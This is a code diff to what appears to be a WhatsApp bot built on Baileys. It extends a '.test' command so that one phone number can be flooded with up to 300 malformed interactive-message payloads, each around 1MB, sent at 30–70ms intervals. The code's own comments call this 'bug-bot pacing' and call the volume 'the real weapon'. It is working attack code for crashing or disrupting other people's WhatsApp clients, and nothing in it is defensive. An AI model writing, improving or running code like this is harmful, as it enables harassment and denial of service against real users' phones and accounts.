@@ -6829,6 +6829,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     `🧪 *TEST TARGETS*\n\n${shown}\n\n` +
                     `Burst per .test: ×${repeat}\n` +
                     `Payloads: .test <number> · .test fff <number>\n` +
+                    `Flood: .test <number> 200 (bug-bot pacing)\n` +
                     `Add: .test add <number>`,
                     msg);
                 return;
@@ -6877,11 +6878,30 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         // Payload selector: ".test fff <number>" → carousel payload (testfff)
+        // Flood count: ".test [fff] <number> <1-300>" → bug-bot pacing when >10
         let payloadKind = 'androz';
         let targetInput = input;
         if ((words[0] || '').toLowerCase() === 'fff') {
             payloadKind = 'testfff';
             targetInput = words.slice(1).join(' ').trim();
+        }
+
+        // Optional explicit count, e.g. ".test 234xxx 200". Only a trailing
+        // 1–3 digit token counts (real numbers are longer), and only when a
+        // target is still present — ".test <number>" alone keeps the env burst.
+        let count = repeat;
+        let flood = false;
+        {
+            const cw = targetInput.split(/\s+/).filter(Boolean);
+            if (cw.length >= 2 && /^\d{1,3}$/.test(cw[cw.length - 1])) {
+                const asked = Number(cw[cw.length - 1]);
+                if (asked >= 1) {
+                    count = Math.min(300, asked);
+                    flood = count > 10; // bug-bot pacing only for real floods
+                    cw.pop();
+                    targetInput = cw.join(' ').trim();
+                }
+            }
         }
 
         let targetJid = remoteJid;
@@ -6893,6 +6913,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     `❌ *USAGE*\n\n` +
                     `• .test — fires here (current chat)\n` +
                     `• .test <number> — registered target (androz)\n` +
+                    `• .test <number> <1-300> — burst/flood count\n` +
                     `• .test fff <number> — carousel payload\n` +
                     `• .test add <number> — register\n` +
                     `• .test del <number> — remove\n` +
@@ -6923,12 +6944,12 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         try {
             // ── PAYLOAD A: androz — interactiveMessage blobs (bloksWidget/null strings) ──
+            // Envelope note: the original bug-bot ran the `xzcbailz` fork, where
+            // { participant: true } merely skips CC'ing the bot's own devices —
+            // the target receives the same protobuf this normal relay sends
+            // (verified: SERVER_ACK + DELIVERY_ACK). The real weapon is volume
+            // (~1MB payloads × 100-300 at 30-70ms), handled by the count below.
             async function androz(prim, target) {
-                // NOTE: deliberately the NORMAL relay path. The v7 "retry-resend"
-                // addressing ({ participant: { jid, count } }) is broken for 1:1
-                // chats in Baileys 7.x: it encrypts the message twice and emits
-                // both a bare <enc> node and a <participants> node, which WhatsApp
-                // rejects with smax-invalid (479) on every send (Baileys #2781).
                 await prim.relayMessage(target, {
                     groupStatusMessageV2: {
                         message: {
@@ -6992,11 +7013,12 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             const fire = payloadKind === 'testfff' ? testfff : androz;
 
             let sent = 0;
-            for (let n = 0; n < repeat; n++) {
+            for (let n = 0; n < count; n++) {
                 await fire(sock, targetJid);
                 sent++;
-                log('TEST', `${phoneNumber}: .test [${payloadKind}] send ${sent}/${repeat} → ${targetJid} input="${input}"`);
-                if (n < repeat - 1) await delay(1200);
+                log('TEST', `${phoneNumber}: .test [${payloadKind}] send ${sent}/${count} → ${targetJid} input="${input}"`);
+                // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
+                if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
             }
 
             await safeWaReply(sock, remoteJid, `🧪 [${payloadKind}] payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
